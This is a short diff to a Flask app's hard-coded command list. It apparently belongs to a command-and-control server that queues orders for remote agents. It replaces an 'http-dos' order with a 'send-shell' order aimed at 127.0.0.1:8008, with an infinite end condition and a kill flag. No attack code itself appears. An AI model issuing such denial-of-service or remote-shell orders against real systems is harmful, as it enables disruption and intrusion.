@@ -6,8 +6,10 @@ app = Flask(__name__)
 
 commands = [
         { 'id':'0',
-          'command':u'http-dos 127.0.0.1:80',
+          'command':u'send-shell',
+          'target':u'127.0.0.1:8008',
           'end_cond':u'inf',
+          'kill-now':u'False',
         }
         ]
 
